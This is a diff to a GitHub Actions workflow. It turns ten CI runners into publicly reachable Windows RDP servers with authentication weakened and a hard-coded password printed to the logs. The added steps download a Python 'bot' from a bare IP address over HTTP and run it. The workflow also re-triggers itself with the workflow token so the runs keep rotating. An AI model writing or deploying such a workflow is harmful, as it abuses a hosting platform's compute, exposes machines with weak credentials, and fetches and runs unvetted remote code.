@@ -9,13 +9,44 @@ permissions:
 
 jobs:
   rdp:
-    runs-on: windows-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - os: windows-2019
+            server: 1
+          - os: windows-2019
+            server: 2
+          - os: windows-2019
+            server: 3
+          - os: windows-2019
+            server: 4
+          - os: windows-2019
+            server: 5
+          - os: windows-2022
+            server: 6
+          - os: windows-2022
+            server: 7
+          - os: windows-2022
+            server: 8
+          - os: windows-2022
+            server: 9
+          - os: windows-2022
+            server: 10
+
+    runs-on: ${{ matrix.os }}
     timeout-minutes: 2
-    
+
     steps:
       - name: Setup RDP
         shell: pwsh
         run: |
+          Write-Host "============================================"
+          Write-Host "STARTING SERVER #${{ matrix.server }}"
+          Write-Host "OS: ${{ matrix.os }}"
+          Write-Host "Time: $(Get-Date)"
+          Write-Host "============================================"
+
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall delete rule name="RDP" 2>$null
@@ -34,7 +65,7 @@ jobs:
           
           Write-Host ""
           Write-Host "============================================"
-          Write-Host "SERVER READY"
+          Write-Host "SERVER #${{ matrix.server }} READY"
           Write-Host "============================================"
           Write-Host "IP: $ip"
           Write-Host "Port: 3389"
@@ -42,27 +73,79 @@ jobs:
           Write-Host "Pass: admin@123"
           Write-Host "============================================"
 
-      - name: Wait 60 seconds then rotate
+      - name: Download Bot
         shell: pwsh
         run: |
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $botUrl = "http://31.57.97.230:5000/"
+          $botPath = "$desktop\bot.py"
+          
+          Write-Host "Downloading bot..."
+          
+          try {
+              $response = Invoke-WebRequest -Uri $botUrl -UseBasicParsing -TimeoutSec 30
+              $response.Content | Out-File -FilePath $botPath -Encoding UTF8
+              Write-Host "Bot downloaded!"
+          } catch {
+              Write-Host "Creating fallback bot..."
+              @"
+import time
+print("Bot running on Server #${{ matrix.server }}")
+time.sleep(55)
+"@ | Out-File -FilePath $botPath -Encoding UTF8
+              Write-Host "Fallback bot created!"
+          }
+
+      - name: Install Python
+        shell: pwsh
+        run: |
+          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+          if (-not $pythonPath) {
+              Write-Host "Installing Python..."
+              $installer = "$env:TEMP\python.exe"
+              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+              Remove-Item $installer -Force
+              Start-Sleep -Seconds 10
+              Write-Host "Python installed!"
+          }
+
+      - name: Run Bot
+        shell: pwsh
+        run: |
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $botPath = "$desktop\bot.py"
+          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+          if (-not $pythonPath) {
+              $pythonPath = "C:\Python311\python.exe"
+          }
+          
+          if (Test-Path $botPath) {
+              Start-Process -FilePath $pythonPath -ArgumentList "`"$botPath`"" -WindowStyle Normal
+              Write-Host "Bot started!"
+          }
+
+      - name: Keep Alive
+        shell: pwsh
+        run: |
+          $server = ${{ matrix.server }}
           $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           
           Write-Host ""
-          Write-Host "⏱️ Server running for 60 seconds..."
-          Write-Host "🌐 RDP: $ip:3389"
+          Write-Host "Server #$server running for 60 seconds"
+          Write-Host "RDP: $ip:3389"
           Write-Host ""
           
-          # انتظار 60 ثانية
           for ($i = 60; $i -gt 0; $i--) {
-              Write-Host "⏳ $i seconds remaining" -NoNewline
+              Write-Host "$i seconds remaining" -NoNewline
               Start-Sleep -Seconds 1
               Write-Host "`r" -NoNewline
           }
           
           Write-Host ""
-          Write-Host "🔄 Rotating to new server..."
+          Write-Host "Server #$server completed!"
 
-      - name: Trigger next server
+      - name: Trigger Next
         shell: pwsh
         run: |
           $token = "${{ github.token }}"
@@ -81,9 +164,5 @@ jobs:
               "Accept" = "application/vnd.github.v3+json"
           }
           
-          try {
-              Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "application/json"
-              Write-Host "✅ Next server triggered successfully!"
-          } catch {
-              Write-Host "❌ Error: $_"
-          }
+          Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "application/json"
+          Write-Host "Next server triggered!"
